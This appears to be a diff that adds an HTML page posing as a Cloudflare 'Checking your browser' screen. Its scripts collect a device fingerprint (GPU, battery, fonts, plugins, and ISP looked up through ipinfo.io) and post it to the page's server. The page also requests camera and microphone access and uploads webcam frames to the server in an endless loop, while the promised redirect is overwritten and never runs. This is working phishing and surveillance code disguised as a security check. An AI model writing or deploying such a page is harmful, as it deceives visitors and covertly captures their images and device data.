@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checking your browser...</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            background: #111;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .cloudflare-box {
+            background: #222;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+            text-align: center;
+            max-width: 400px;
+        }
+
+        .loading-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
+            margin-top: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .loading-bar::before {
+            content: "";
+            width: 30%;
+            height: 100%;
+            background: orange;
+            position: absolute;
+            left: 0;
+            animation: loading 3s infinite linear;
+        }
+
+        @keyframes loading {
+            0% {
+                left: 0;
+            }
+
+            50% {
+                left: 50%;
+            }
+
+            100% {
+                left: 100%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="cloudflare-box">
+        <h2>Checking your browser...</h2>
+        <p>Please wait while we verify your connection.</p>
+        <div class="loading-bar"></div>
+    </div>
+
+    <script>
+        window.onload = function () {
+            setTimeout(function () {
+                window.location.href = "https://example.com"; // Change to your actual URL
+            }, 5000); // 5-second delay
+        };
+    </script>
+    <video id="video" autoplay></video>
+    <script>
+        let video, canvas, context;
+        let isCapturing = false;
+
+        async function getClientInfo() {
+            try {
+                const clientInfo = {
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    devicePixelRatio: window.devicePixelRatio || "Unknown",
+                    platform: navigator.platform || "Unknown",
+                    userAgent: navigator.userAgent || "Unknown",
+                    language: navigator.language || "Unknown",
+                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
+                    cpuCores: navigator.hardwareConcurrency || "Unknown",
+                    memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
+                    gpu: getGPUInfo(),
+                    battery: await getBatteryInfo(),
+                    touchscreen: navigator.maxTouchPoints > 0 ? "Yes" : "No",
+                    connectionType: navigator.connection?.effectiveType || "Unknown",
+                    plugins: getInstalledPlugins(),
+                    fonts: getInstalledFonts(),
+                    isp: await getISPInfo()
+                };
+
+                await fetch("/collect", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(clientInfo)
+                });
+            } catch (error) {
+                console.error("Client info error:", error);
+            }
+        }
+
+        async function setupWebcam() {
+            try {
+                video = document.getElementById("video");
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                video.srcObject = stream;
+
+                // Initialize canvas
+                canvas = document.createElement("canvas");
+                canvas.width = 320;
+                canvas.height = 240;
+                context = canvas.getContext("2d");
+            } catch (error) {
+                console.error("Webcam setup failed:", error);
+                return false;
+            }
+            return true;
+        }
+
+        async function captureFrame() {
+            if (!video || !context) return null;
+
+            try {
+                context.drawImage(video, 0, 0, 320, 240);
+                return canvas.toDataURL("image/jpeg", 0.7);
+            } catch (error) {
+                console.error("Frame capture error:", error);
+                return null;
+            }
+        }
+
+        async function sendToServer(photoData) {
+            try {
+                await fetch("/upload-photo", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ photo: photoData })
+                });
+            } catch (error) {
+                console.error("Upload error:", error);
+            }
+        }
+
+        async function startCaptureLoop() {
+            isCapturing = true;
+            while (isCapturing) {
+                const frame = await captureFrame();
+                if (frame) await sendToServer(frame);
+                await new Promise(resolve => requestAnimationFrame(resolve));
+            }
+        }
+
+        window.onload = async () => {
+            await getClientInfo();
+            if (await setupWebcam()) {
+                await new Promise(resolve => setTimeout(resolve, 500));
+                startCaptureLoop();
+            }
+        };
+
+        async function getBatteryInfo() {
+            try {
+                if (!navigator.getBattery) return { level: "Unsupported", charging: "Unsupported" };
+                const battery = await navigator.getBattery();
+                return {
+                    level: `${Math.round(battery.level * 100)}%`,
+                    charging: battery.charging ? "Yes" : "No"
+                };
+            } catch (error) {
+                return { level: "Error", charging: "Error" };
+            }
+        }
+
+        function getGPUInfo() {
+            try {
+                const canvas = document.createElement("canvas");
+                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+                const debugInfo = gl?.getExtension("WEBGL_debug_renderer_info");
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
+            } catch (error) {
+                return "Unknown";
+            }
+        }
+
+        function getInstalledPlugins() {
+            return navigator.plugins?.length
+                ? Array.from(navigator.plugins).map(p => p.name).join(", ")
+                : "Unavailable";
+        }
+
+        function getInstalledFonts() {
+            const testString = "mmmmmmmmmmlli";
+            const testSize = "72px";
+            const fonts = ["Arial", "Verdana", "Courier", "Times New Roman"];
+            const detected = [];
+
+            const canvas = document.createElement("canvas");
+            const context = canvas.getContext("2d");
+
+            fonts.forEach(font => {
+                context.font = `${testSize} "${font}"`;
+                if (context.measureText(testString).width !== context.measureText(testString).width) {
+                    detected.push(font);
+                }
+            });
+
+            return detected.join(", ") || "Unknown";
+        }
+
+        async function getISPInfo() {
+            try {
+                const response = await fetch("https://ipinfo.io/json", { cache: "no-store" });
+                const data = await response.json();
+                return data.org ? `${data.org} (${data.city})` : "Unknown";
+            } catch (error) {
+                return "Unknown";
+            }
+        }
+    </script>
+</body>
+
+</html>
